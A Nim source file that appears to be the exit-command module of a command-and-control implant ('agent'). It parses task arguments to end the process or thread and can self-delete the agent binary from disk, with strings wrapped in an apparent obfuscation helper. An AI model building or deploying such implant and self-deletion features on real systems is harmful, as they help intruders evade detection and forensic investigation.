import ../common/[types, utils]

# Define function prototype
proc executeExit(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let commands* = @[
        Command(
            name: protect("exit"),
            commandType: CMD_EXIT,
            description: protect("Exit the agent process."),
            example: protect("exit process"),
            arguments: @[
                Argument(name: protect("exitType"), description: protect("Available options: PROCESS/THREAD. Default: PROCESS."), argumentType: STRING, isRequired: false),
                Argument(name: protect("selfDelete"), description: protect("Attempt to delete the binary within which is the agent was running from disk. Default: false"), argumentType: BOOL, isRequired: false),
            ],
            execute: executeExit
        )
    ] 

# Implement execution functions
when not defined(agent):
    proc executeExit(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import strutils, strformat
    import ../agent/utils/io
    import ../agent/core/exit
    import ../agent/protocol/result
    import ../common/[utils, serialize]

    proc executeExit(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Exiting."

            case task.argCount: 
            of 0: 
                exit()
            of 1: 
                let exitType = parseEnum[ExitType](Bytes.toString(task.args[0].data))
                exit(exitType)
            else: 
                let exitType = parseEnum[ExitType](Bytes.toString(task.args[0].data))
                let selfDelete = cast[bool](task.args[1].data[0])
                exit(exitType, selfDelete)

        except CatchableError as err:
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))